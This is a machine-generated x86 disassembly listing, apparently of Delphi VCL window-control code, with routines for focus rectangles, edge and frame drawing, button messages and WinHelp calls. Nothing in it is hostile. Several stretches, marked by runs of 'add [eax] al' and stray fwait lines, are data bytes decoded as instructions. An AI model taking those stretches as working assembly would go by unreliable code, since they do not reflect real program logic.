mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_420c38
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42046c
xor edx edx
mov eax [ esi + 0x208 ]
call sub_4214ec
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_438d54
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_438d80
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_441334
mov eax ebx
call sub_43fed8
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_456c04
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_440358
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43fee8
sub_438df8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_437bec
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_438e54
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_444628
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43907d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e88c
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_420c38
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42104c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42104c
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43f650
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_420c38
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42104c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42104c
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_437600
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call DrawFrameControl
jmp r-xdata
sub_439090
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442190
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4390b4
push ebx
mov ebx eax
mov eax ebx
call sub_44c254
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4390ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_439142
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_439150
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4421c4
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4391a4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_446f5c
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4391f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43921c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_443eac
mov eax ebx
mov si 0xffb5
call sub_4034e4
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4464d0
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4034e4
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_439294
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_433194
mov ebx eax
mov eax ebx
call sub_433274
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4464d0
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_433374
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4392e0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_433194
call sub_433274
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4448ec
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43930c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443324
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_439344
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439150
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43f46c
mov edx 0x19
mov eax esi
call sub_43f490
mov dl 0x1
mov eax esi
call sub_446704
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4393d0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4467d4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4464d0
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4464d0
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_439424
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_456c04
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_440e64
sub_439458
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43930c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443250
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4394c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_445914
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_456b0c
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034e4
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43952d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4395a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fcb0
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_456b94
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44591c
mov eax ebx
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034e4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4395ad
sub_4395b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_445924
pop edi
pop esi
pop ebx
retn
sub_439608
push ebx
push esi
mov esi edx
mov ebx eax
call sub_433194
call sub_433274
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_439634
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_433194
mov ebx eax
mov eax ebx
call sub_433274
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4464d0
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_433374
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439680
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439150
mov edx 0x61
mov eax esi
call sub_43f46c
mov edx 0x11
mov eax esi
call sub_43f490
mov dl 0x1
mov eax esi
call sub_446704
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4396ec
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4034e4
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_439718
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_4397a0
retn
mov dl 0x2
call sub_4397a0
jmp r-xdata
xor edx edx
call sub_4397a0
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_4397a0
jmp r-xdata
sub_4397a0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4034e4
sub_4397f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43930c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443250
mov eax ebx
mov si 0xffc8
call sub_4034e4
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_43984f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6409173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_439898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439926
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fcb0
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_456b94
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44591c
mov eax ebx
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_4034e4
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43992d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_439944
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439970
retn
sub_439980
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x9a
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 ] bl
inc ebx
add [ eax + 0x64000000 ] ah
mov edx 0xd8080044
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x3c73ffc0 ] bl
inc esp
add ah bl
retn
sub_439a70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c338
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_439aac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439ad1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ad8
retn
sub_439ae4
push 0xfb004786
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43a447
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43a5d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a44e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40405c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4081d4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43a52c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4081d4
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40408c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_439c90
mov eax [ ebp - 0x14 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_439b7c
pop ebp
fwait
inc ebx
add [ edi - 0x65 ] ah
inc ebx
add [ ecx - 0x65 ] dh
inc ebx
add [ 0x1d00439b ] dl
fwait
inc ebx
add [ 0x2d00439b ] ah
fwait
inc ebx
add [ 0x3d00439b ] dh
fwait
inc ebx
add [ ebp - 0x65 ] al
fwait
cmp bh [ ebx + ebx * 4 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ebp - 0x65 ] cl
inc ebx
add [ ebp - 0x65 ] dl
inc ebx
add ch dh
0x9afd0043 0x43
add eax 0xd00439b
fwait
inc ebx
add ch ch
cmp eax 0x4500439b
fwait
cmp bh [ ebx + ebx * 4 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
0x30043 0x0
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
or eax 0xed00439b
cmp bh [ ebx + ebx * 4 + 0x43 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 + 0x43 ] ah
add al al
fwait
inc ebx
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x64 ] bh
inc ebx
add [ eax + eax ] ah
add [ eax ] al
inc esp
adc al [ eax ]
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi - 0x58fbffc0 ] bl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
adc al 0x0
add [ eax ] al
push eax
mov [ edx ] al
sbb al 0x0
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439d45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404038
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040d0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d4c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_439c90
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439d45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404038
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040d0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d4c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_439d60
push ebx
mov ebx eax
mov eax ebx
call sub_43a090
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405928
sub_439d9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439e03
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_439c90
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e0a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_439e14
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_439e9c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_439d88
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ea3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_439eaf
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439f37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43a5d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f3e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_439c90
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439ebc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439f37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43a5d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f3e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_439c90
cmp [ ebp - 0x4 ] 0x0
je r-xdata
